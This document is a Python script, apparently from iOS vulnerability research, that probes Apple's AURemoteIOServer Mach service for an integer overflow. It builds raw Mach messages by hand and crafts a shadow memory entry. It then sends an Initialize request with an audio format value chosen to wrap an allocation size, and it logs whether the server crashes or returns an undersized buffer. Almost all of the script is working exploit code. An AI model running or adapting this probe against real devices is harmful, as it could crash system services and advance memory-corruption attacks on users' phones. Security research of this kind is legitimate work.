"""
Surface C combined probe: AURemoteIOServer ASBD integer overflow
Stage A (NewClient) + Stage B (Initialize overflow ASBD) in one script.

Pre-flight:
  1. Close PocketCode entirely (memory)
  2. Play 2s of audio on the iPhone (pre-warms AURemoteIOServer)
  3. Reopen ResearchHost, run this via offload_python

Expected outcomes:
  - TIMEOUT (8s) on Initialize reply → crash/hang in AURemoteIOServer → CONFIRMED
  - Complex reply OOL[0].sz == 0x1000 → allocation is overflowed size → CONFIRMED
  - Non-complex reply with error code → ASBD rejected (need different values)
  - mach_msg kr=0x10004003 on Initialize → server unresponsive → CONFIRMED (crash)
"""

import ctypes as C, struct, threading

APPGROUP = (
    "/private/var/mobile/Containers/Shared/AppGroup"
    "/92767569-346F-4ECE-B7F6-8107C7A21B5B/Library"
)
LOG_FILE = f"{APPGROUP}/surface_c_combined.txt"

import time, os, sys

def log(msg):
    ts = time.strftime("%H:%M:%S")
    line = f"[{ts}] {msg}\n"
    sys.stdout.write(line)
    sys.stdout.flush()
    try:
        with open(LOG_FILE, "a") as f:
            f.write(line); f.flush(); os.fsync(f.fileno())
    except Exception as e:
        sys.stdout.write(f"[LOG_ERR] {e}\n"); sys.stdout.flush()

log("=== Surface C combined probe ===")

L = C.CDLL('/usr/lib/libSystem.B.dylib')
L.mach_task_self.restype  = C.c_uint32
L.mach_host_self.restype  = C.c_uint32
L.mach_reply_port.restype = C.c_uint32
L.mach_msg.restype        = C.c_int32
L.mach_msg.argtypes       = [C.c_void_p, C.c_uint32, C.c_uint32, C.c_uint32,
                               C.c_uint32, C.c_uint32, C.c_uint32]
L.bootstrap_look_up.argtypes = [C.c_uint32, C.c_char_p, C.POINTER(C.c_uint32)]
L.bootstrap_look_up.restype  = C.c_int32
L.mach_make_memory_entry_64.argtypes = [
    C.c_uint32, C.POINTER(C.c_uint64), C.c_uint64, C.c_int,
    C.POINTER(C.c_uint32), C.c_uint32]
L.mach_vm_map.argtypes = [
    C.c_uint32, C.POINTER(C.c_uint64), C.c_uint64, C.c_uint64,
    C.c_int, C.c_uint32, C.c_uint64, C.c_int, C.c_int, C.c_int, C.c_int]
L.mach_vm_allocate.argtypes = [
    C.c_uint32, C.POINTER(C.c_uint64), C.c_uint64, C.c_int]
L.host_statistics64.restype  = C.c_int
L.host_statistics64.argtypes = [C.c_uint32, C.c_int, C.c_void_p, C.POINTER(C.c_uint32)]

t  = L.mach_task_self()
h  = L.mach_host_self()

# --- Memory gate ---
vmstat = (C.c_uint32 * 38)()
cnt    = C.c_uint32(38)
L.host_statistics64(h, 4, vmstat, C.byref(cnt))
free_mb = vmstat[0] * 0x4000 // (1024 * 1024)
log(f"free_mb={free_mb}")
if free_mb < 150:
    log("BAIL: < 150 MB free — close apps and retry")
    raise RuntimeError("low memory")

# --- Stage A: build shadow named entry ---
log("Stage A: building shadow named entry ...")
a = C.c_uint64(0)
kr = L.mach_vm_allocate(t, C.byref(a), 0x4000, 1)
log(f"alloc kr={kr} va={hex(a.value)}")
if kr != 0: raise RuntimeError(f"mach_vm_allocate: {kr:#x}")

M = L.mach_make_memory_entry_64
p = C.c_uint32(0); ps = C.c_uint64(0x4000)
kr = M(t, C.byref(ps), a.value, 3, C.byref(p), 0)
log(f"parent_ne kr={kr} ne={p.value}")
if kr != 0: raise RuntimeError(f"parent MMME64: {kr:#x}")

c = C.c_uint32(0); cs = C.c_uint64(0x1001)
kr = M(t, C.byref(cs), 0x1000, 3, C.byref(c), p.value)
log(f"child_ne kr={kr} ne={c.value}")
if kr != 0: raise RuntimeError(f"child MMME64: {kr:#x}")

m = C.c_uint64(0)
kr = L.mach_vm_map(t, C.byref(m), 0x4000, 0, 1, c.value, 0, 0, 3, 3, 0)
log(f"map_child kr={kr} va={hex(m.value)}")
if kr != 0: raise RuntimeError(f"mach_vm_map: {kr:#x}")

shadow_ne = C.c_uint32(0); ns = C.c_uint64(0x1000)
kr = M(t, C.byref(ns), m.value + 0x3000, 3, C.byref(shadow_ne), 0)
log(f"shadow_ne kr={kr} ne={shadow_ne.value}")
if kr != 0: raise RuntimeError(f"shadow MMME64: {kr:#x}")

# --- Stage A: NewClient ---
log("Stage A: bootstrap_look_up AURemoteIOServer ...")
bs  = C.c_uint32.in_dll(L, "bootstrap_port").value
svc = C.c_uint32(0)
result = [None]
def _lookup():
    r = L.bootstrap_look_up(bs, b"com.apple.audio.AURemoteIOServer", C.byref(svc))
    result[0] = r
lt = threading.Thread(target=_lookup, daemon=True)
lt.start(); lt.join(timeout=5)
if result[0] is None:
    log("BAIL: bootstrap_look_up hung (5s) — play audio on iPhone first, then retry")
    raise RuntimeError("bootstrap_look_up timeout")
log(f"svc_lookup kr={result[0]:#x} port={svc.value}")
if result[0] != 0 or svc.value == 0:
    raise RuntimeError(f"bootstrap_look_up failed: kr={result[0]:#x}")

COMPLEX = 0x80000000
SO_BITS = (0x15 << 8) | 0x13   # MAKE_SEND_ONCE | COPY_SEND

# mach_reply_port() returns a guarded/immovable port that triggers EXC_GUARD
# with MAKE_SEND_ONCE via msgh_bits. Use mach_port_allocate for a plain receive right.
L.mach_port_allocate.argtypes = [C.c_uint32, C.c_int, C.POINTER(C.c_uint32)]
L.mach_port_allocate.restype  = C.c_int
rp_name = C.c_uint32(0)
kr = L.mach_port_allocate(t, 1, C.byref(rp_name))  # MACH_PORT_RIGHT_RECEIVE = 1
if kr != 0: raise RuntimeError(f"mach_port_allocate rp: {kr:#x}")
rp = rp_name.value
log(f"rp={rp:#x}")
buf = bytearray(0x200)
struct.pack_into('<IIIIII', buf, 0x00, COMPLEX | SO_BITS, 0x3c, svc.value, rp, 0, 0x157c1)
struct.pack_into('<I', buf, 0x18, 1)              # descriptor_count=1
struct.pack_into('<IIHBB', buf, 0x1c, shadow_ne.value, 0, 0, 17, 0)  # PORT MOVE_SEND
buf[0x28:0x30] = b'\x00\x00\x00\x00\x01\x00\x00\x00'  # NDR
struct.pack_into('<II', buf, 0x34, 0, 1)          # client_type=0, session_id=1
buf_c = (C.c_uint8 * len(buf)).from_buffer(buf)

log("Sending NewClient ...")
kr = L.mach_msg(buf_c, 0x113, 0x3c, len(buf), rp, 8000, 0)
log(f"NewClient mach_msg kr={kr:#010x}")
if kr != 0:
    log(f"FAILED — {kr:#010x}. If 0x10004003: server not running (play audio first)")
    raise RuntimeError(f"mach_msg NewClient: {kr:#010x}")

r_bits  = struct.unpack_from('<I', buf, 0)[0]
if r_bits & COMPLEX:
    nc_hndl = struct.unpack_from('<I', buf, 0x1c)[0]
    log(f"complex reply: nc_hndl={nc_hndl:#x}")
else:
    nc_ret  = struct.unpack_from('<i', buf, 0x20)[0]
    nc_hndl = struct.unpack_from('<I', buf, 0x24)[0]
    log(f"simple reply: ret={nc_ret:#010x} nc_hndl={nc_hndl:#x}")
    if nc_ret != 0:
        raise RuntimeError(f"NewClient ret={nc_ret:#010x}")

if nc_hndl == 0:
    raise RuntimeError("NewClient returned nc_hndl=0")
log(f"Stage A OK: nc_hndl={nc_hndl:#x}")

# --- Stage B: Initialize with overflow ASBD ---
log("Stage B: sending Initialize with overflow ASBD ...")

OVERFLOW_BPF = 0xFFF001  # (0x1000 * 0xFFF001 + 15) & 0xFFFFFFFF = 0x100F → aligned = 0x1000

def asbd(bpf, bpp=None, chans=1, sr=44100.0):
    bp = bpp if bpp is not None else bpf
    return struct.pack('<dIIIIIIII',
        sr,
        0x6C70636D,  # lpcm
        0x2C,        # float packed LE interleaved
        bp, 1, bpf, chans, 32, 0)

ASBD_NORMAL   = asbd(4)
ASBD_OVERFLOW = asbd(OVERFLOW_BPF, bpp=OVERFLOW_BPF)
assert len(ASBD_NORMAL) == 40 and len(ASBD_OVERFLOW) == 40

rp2_name = C.c_uint32(0)
kr = L.mach_port_allocate(t, 1, C.byref(rp2_name))
if kr != 0: raise RuntimeError(f"mach_port_allocate rp2: {kr:#x}")
rp2 = rp2_name.value
log(f"rp2={rp2:#x}")
buf = bytearray(0x200)
struct.pack_into('<IIIIII', buf, 0x00, SO_BITS, 0x78, svc.value, rp2, 0, 0x157c3)
buf[0x18:0x20] = b'\x00\x00\x00\x00\x01\x00\x00\x00'  # NDR
struct.pack_into('<I', buf, 0x20, nc_hndl)
buf[0x28:0x50] = ASBD_NORMAL
buf[0x50:0x78] = ASBD_OVERFLOW
buf_c = (C.c_uint8 * len(buf)).from_buffer(buf)

log(f"Initialize: nc_hndl={nc_hndl:#x} ASBD2.mBytesPerFrame=0x{OVERFLOW_BPF:x}")
kr = L.mach_msg(buf_c, 0x113, 0x78, len(buf), rp2, 8000, 0)
log(f"Initialize mach_msg kr={kr:#010x}")

if kr == 0x10004003:
    log("TIMEOUT (8s) — server hung or crashed, no reply — LIKELY OVERFLOW HIT")
    log("RESULT: AURemoteIOServer crash/hang confirmed by timeout")
    raise RuntimeError("Initialize timed out (crash signal)")
if kr != 0:
    log(f"mach_msg error: {kr:#x}")
    raise RuntimeError(f"mach_msg Initialize: {kr:#x}")

in_bits = struct.unpack_from('<I', buf, 0)[0]
in_size = struct.unpack_from('<I', buf, 4)[0]
is_cmplx = bool(in_bits & COMPLEX)
log(f"Initialize reply: bits={in_bits:#x} size={in_size} complex={is_cmplx}")

if not is_cmplx:
    ret = struct.unpack_from('<i', buf, 0x20)[0]
    log(f"  non-complex ret={ret:#010x}")
    if   ret == -50:          log("  kAudio_ParamError — ASBD fields invalid/out of range")
    elif ret == 0xBF88AEC1:   log("  kAudioUnitErr_InvalidProperty")
    elif ret == 0xBF88AECD:   log("  kAudioUnitErr_FormatNotSupported")
    else:                     log(f"  unknown error {ret:#010x}")
    log("RESULT: ASBD rejected — try different mBytesPerFrame value")
else:
    in_dcnt = struct.unpack_from('<I', buf, 0x18)[0]
    log(f"  complex reply: {in_dcnt} descriptors")
    overflow_seen = False
    for i in range(in_dcnt):
        off   = 0x1c + i * 16
        addr  = struct.unpack_from('<Q', buf, off)[0]
        sz    = struct.unpack_from('<I', buf, off + 8)[0]
        flags = struct.unpack_from('<I', buf, off + 12)[0]
        log(f"  OOL[{i}]: addr={addr:#x} sz={sz:#x} type={flags & 0xff}")
        if sz == 0x1000:
            log(f"  *** OVERFLOW CONFIRMED: OOL[{i}].sz=0x1000 — allocation is overflow-wrapped size!")
            overflow_seen = True
        elif sz >= 0x100000:
            log(f"  normal size (no overflow)")
    retcode_off = 0x1c + in_dcnt * 16
    retcode = struct.unpack_from('<i', buf, retcode_off + 8)[0]
    log(f"  RetCode={retcode:#010x}")
    if overflow_seen:
        log("RESULT: OVERFLOW CONFIRMED via OOL size")
    elif retcode == 0:
        log("RESULT: Initialize OK — overflow may not have triggered; check OOL sizes")
    else:
        log(f"RESULT: server error {retcode:#010x}")

log("=== DONE ===")
